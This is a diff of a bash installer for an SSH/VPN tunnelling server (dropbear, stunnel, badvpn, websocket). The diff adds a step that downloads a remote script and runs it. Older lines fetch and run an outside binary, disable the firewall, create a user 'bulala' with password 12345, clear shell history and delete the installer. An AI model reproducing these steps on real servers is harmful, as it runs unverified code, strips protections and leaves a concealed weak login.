@@ -7,26 +7,23 @@ timedatectl set-timezone Asia/Riyadh
 
 
 system_package (){
-  sudo timedatectl set-timezone Asia/Manila
-  timedatectl
-  apt-get update -y
-  sudo apt install screen
-  ufw disable
-  apt update
+sudo timedatectl set-timezone Asia/Manila
+timedatectl
+apt-get update -y
+sudo apt install screen
+ufw disable
+apt update
 apt install -y gnupg openssl
 apt install -y iptables socat
 apt install -y netcat httpie php neofetch vnstat
 apt install -y pwgen python php jq curl
 apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
 apt install -y build-essential
-        sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
-  service apache2 restart
+sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
+service apache2 restart
 }
 
-
-
 modify_badvpn(){
-
 
 clear
 echo 'modifying badvpn'
@@ -35,8 +32,6 @@ wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 }
-}
-
 
 install_firewall_kvm () {
 clear
@@ -50,13 +45,10 @@ iptables -F
 iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
 }
-}
-
 
 install_rclocal(){
-  {
-
-    echo "[Unit]
+{
+echo "[Unit]
 Description=tknetwork service
 Documentation=http://teamkidlat.com
 
@@ -67,27 +59,22 @@ RemainAfterExit=yes
 
 [Install]
 WantedBy=multi-user.target" >> /etc/systemd/system/tknetwork.service
-    echo '#!/bin/sh -e
+echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
 screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
 exit 0' >> /etc/rc.local
-    sudo chmod +x /etc/rc.local
-    systemctl daemon-reload
-    sudo systemctl enable tknetwork
-    sudo systemctl start tknetwork.service
-  }
+sudo chmod +x /etc/rc.local
+systemctl daemon-reload
+sudo systemctl enable tknetwork
+sudo systemctl start tknetwork.service  
 }
-
-
-
 
 
 install_dropbear (){
 
 apt-get -y install dropbear
-
 rm -rf /etc/default/dropbear
 
 cat > /etc/default/dropbear << MyDropbear
@@ -109,7 +96,7 @@ echo '/usr/sbin/nologin' >> /etc/shells
 service dropbear restart
 service ssh restart
 
-  #install_banner
+#install_banner
 echo "Adding banner."
 
 cat > /etc/banner << MyBanner
@@ -129,8 +116,6 @@ cat > /etc/banner << MyBanner
 <br><font color=yellow size=7><b>POWERED BY: Mediatek</b></font>
 <br>
 MyBanner
-
-
 
 }
 
@@ -206,6 +191,7 @@ connect = 127.0.0.1:22
 [dropbear]
 accept = 443
 connect = 127.0.0.1:442'| sudo tee /etc/stunnel/stunnel.conf
+
 }
 
 install_proxy () {
@@ -740,7 +726,6 @@ websocket
 
 install_cron () {
 
-
 cat << \autostart > /bin/auto
 #!/bin/bash
 
@@ -799,7 +784,6 @@ echo "* * * * * /bin/bash /bin/auto >/dev/null 2>&1
 * * * * * /bin/bash /root/auth.sh >/dev/null 2>&1" | crontab
 }
 
-
 iptablesrules () {
 echo 'net.ipv4.ip_forward=1
 ' >> /etc/sysctl.conf
@@ -810,8 +794,6 @@ SELINUX=disabled
 sysctl -p
 }
 
-
-
 serviceenable () {
 update-rc.d cron enable
 update-rc.d stunnel4 enable
@@ -820,18 +802,22 @@ cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 sed -i 's/#ForwardToWall=yes/ForwardToWall=no/g' /etc/systemd/journald.conf
 }
 
+function Slowdns() {
+rm -rf install; wget https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/install; chmod +x install; ./install
+bash /etc/slowdns/slowdns-ssh
+startdns
+}
+
 start_service(){
 clear
 echo 'Installing proxy.'
 {
- /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
- history -c;
- rm ~/install_server.sh
- netstat -tupln
- reboot
+/usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
+history -c;
+rm ~/install_server.sh
+netstat -tupln
+reboot
 }
-}
-
 
 system_package
 modify_badvpn
@@ -844,4 +830,5 @@ install_newwebsocket
 install_cron
 iptablesrules
 serviceenable
+Slowdns
 start_service
